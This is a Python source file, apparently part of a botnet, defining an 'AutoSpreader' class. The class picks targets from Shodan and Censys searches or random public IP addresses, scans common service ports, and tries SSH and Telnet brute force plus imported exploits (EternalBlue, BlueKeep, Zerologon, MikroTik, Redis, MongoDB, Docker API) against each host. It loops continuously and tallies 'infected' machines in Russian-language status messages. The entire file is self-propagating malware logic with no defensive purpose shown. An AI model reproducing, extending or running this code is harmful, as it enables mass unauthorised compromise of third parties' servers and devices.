import asyncio, threading, time, json, os, random, ipaddress, socket, struct, queue
from botnet.spreader import (
    ssh_bruteforce, telnet_bruteforce, exploit_eternalblue, exploit_bluekeep,
    exploit_mikrotik, exploit_zerologon, exploit_redis, exploit_mongodb,
    exploit_docker_api, init_db, add_bot
)
from utils.logger import log
import shodan, censys

class AutoSpreader:
    def __init__(self, settings_file="avz_settings.json"):
        self.running = False
        self.thread = None
        self.message_queue = queue.Queue()
        self.stats = {'scanned':0, 'infected':0, 'open_ports':0}
        self.load_settings(settings_file)

    def load_settings(self, path):
        try:
            with open(path, "r") as f:
                s = json.load(f)
        except:
            s = {}
        self.enabled = s.get("auto_spread_enabled", True)
        self.interval = s.get("auto_spread_interval_min", 0.5) * 60
        self.ranges = s.get("auto_spread_ranges", [])
        self.random_global = s.get("auto_spread_random_global", True)
        self.worker_threads = s.get("spread_worker_threads", 500)
        self.use_shodan = s.get("use_shodan", True)
        self.use_censys = s.get("use_censys", False)
        self.shodan_query = s.get("shodan_search_query", "port:22,23,6379,27017,2375")
        self.shodan_api = None
        self.censys_api = None
        try:
            if self.use_shodan:
                self.shodan_api = shodan.Shodan(s.get('shodan_api_key', ''))
        except: pass
        try:
            if self.use_censys:
                self.censys_api = censys.SearchAPI(
                    api_id=s.get('censys_api_id', ''),
                    api_secret=s.get('censys_api_secret', '')
                )
        except: pass

    def start(self):
        if self.running: return
        self.running = True
        self.stats = {'scanned':0, 'infected':0, 'open_ports':0}
        self.thread = threading.Thread(target=self._worker, daemon=True)
        self.thread.start()
        self.message_queue.put("[System] OVERLORD захват запущен")

    def stop(self):
        self.running = False
        self.message_queue.put(f"[System] Стоп. Всего заражено: {self.stats['infected']}")

    def generate_random_ip(self):
        while True:
            ip_int = random.randint(0, 2**32 - 1)
            ip = socket.inet_ntoa(struct.pack('>I', ip_int))
            if ipaddress.ip_address(ip).is_private: continue
            if ip.startswith("127.") or ip.startswith("224.") or ip.startswith("225."): continue
            return ip

    async def attack_target(self, ip):
        # Расширенный набор портов для серверных сервисов
        ports = await ssh_bruteforce.__globals__['quick_port_scan'](
            ip, [22,23,445,3389,8291,6379,27017,2375], 0.8
        )
        if not ports:
            return False
        self.stats['open_ports'] += 1
        self.message_queue.put(f"[Ports] {ip} открыты: {ports}")
        if 23 in ports:
            if (await telnet_bruteforce(ip))[0]:
                self.stats['infected'] += 1
                return True
        if 22 in ports:
            if (await ssh_bruteforce(ip))[0]:
                self.stats['infected'] += 1
                return True
        if 6379 in ports:
            if await exploit_redis(ip):
                self.stats['infected'] += 1
                return True
        if 27017 in ports:
            if await exploit_mongodb(ip):
                self.stats['infected'] += 1
                return True
        if 2375 in ports:
            if await exploit_docker_api(ip):
                self.stats['infected'] += 1
                return True
        if 445 in ports:
            if any(await asyncio.gather(exploit_eternalblue(ip), exploit_zerologon(ip))):
                self.stats['infected'] += 1
                return True
        if 3389 in ports:
            if await exploit_bluekeep(ip):
                self.stats['infected'] += 1
                return True
        if 8291 in ports:
            if await exploit_mikrotik(ip):
                self.stats['infected'] += 1
                return True
        return False

    def _worker(self):
        loop = asyncio.new_event_loop()
        asyncio.set_event_loop(loop)
        while self.running:
            target_ips = []
            if self.shodan_api:
                try:
                    results = self.shodan_api.search(self.shodan_query, limit=200)
                    target_ips = [match['ip_str'] for match in results['matches']]
                except:
                    pass
            if self.censys_api:
                try:
                    results = self.censys_api.search("(services.port: 6379) OR (services.port: 27017) OR (services.port: 2375)", per_page=100)
                    target_ips.extend([hit['ip'] for hit in results['results']])
                except:
                    pass
            if not target_ips:
                target_ips = [self.generate_random_ip() for _ in range(200)]
            self.stats['scanned'] += len(target_ips)
            self.message_queue.put(f"[Scan] {len(target_ips)} целей")
            sem = asyncio.Semaphore(self.worker_threads)
            tasks = [self.attack_target(ip) for ip in target_ips]
            loop.run_until_complete(asyncio.gather(*tasks))
            self.message_queue.put(f"[Stats] Проверено: {self.stats['scanned']} | Заражено: {self.stats['infected']}")
            time.sleep(self.interval)

    def scan_once(self, target_list):
        if self.running:
            self.message_queue.put("[Ошибка] Автозахват уже запущен")
            return
        threading.Thread(target=self._scan_once_worker, args=(target_list,), daemon=True).start()

    def _scan_once_worker(self, target_list):
        loop = asyncio.new_event_loop()
        asyncio.set_event_loop(loop)
        sem = asyncio.Semaphore(min(self.worker_threads, len(target_list)))
        tasks = [self.attack_target(ip) for ip in target_list]
        loop.run_until_complete(asyncio.gather(*tasks))
        self.message_queue.put(f"[Завершено] Обработано {len(target_list)} целей")
